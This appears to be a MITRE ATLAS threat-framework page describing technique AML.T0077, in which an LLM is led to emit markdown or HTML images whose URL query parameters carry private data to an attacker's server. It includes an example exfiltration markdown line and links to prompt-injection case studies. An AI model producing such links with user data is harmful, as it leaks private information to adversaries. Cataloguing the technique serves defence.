---
id: llm-response-rendering
title: "AML.T0077: LLM Response Rendering"
sidebar_label: "LLM Response Rendering"
sidebar_position: 78
---

# AML.T0077: LLM Response Rendering

An adversary may get a large language model (LLM) to respond with private information that is hidden from the user when the response is rendered by the user's client. The private information is then exfiltrated. This can take the form of rendered images, which automatically make a request to an adversary controlled server. 

The adversary gets AI to present an image to the user, which is rendered by the user's client application with no user clicks required. The image is hosted on an attacker-controlled website, allowing the adversary to exfiltrate data through image request parameters. Variants include HTML tags and markdown

For example, an LLM may produce the following markdown:
```
![ATLAS](https://atlas.mitre.org/image.png?secrets="private data")
```

Which is rendered by the client as:
```
<img src="https://atlas.mitre.org/image.png?secrets="private data">
```

When the request is received by the adversary's server hosting the requested image, they receive the contents of the `secrets` query parameter.

## Metadata

- **Technique ID:** AML.T0077
- **Created:** 2025-04-15
- **Last Modified:** 2025-04-15
- **Maturity:** demonstrated

## Tactics (1)

- [[frameworks/atlas/tactics/exfiltration|Exfiltration]]

## Case Studies (3)

- [[frameworks/atlas/case-studies/chatgpt-conversation-exfiltration|ChatGPT Conversation Exfiltration]]
- [[frameworks/atlas/case-studies/google-bard-conversation-exfiltration|Google Bard Conversation Exfiltration]]
- [[frameworks/atlas/case-studies/data-exfiltration-from-slack-ai-via-indirect-prompt-injection|Data Exfiltration from Slack AI via Indirect Prompt Injection]]
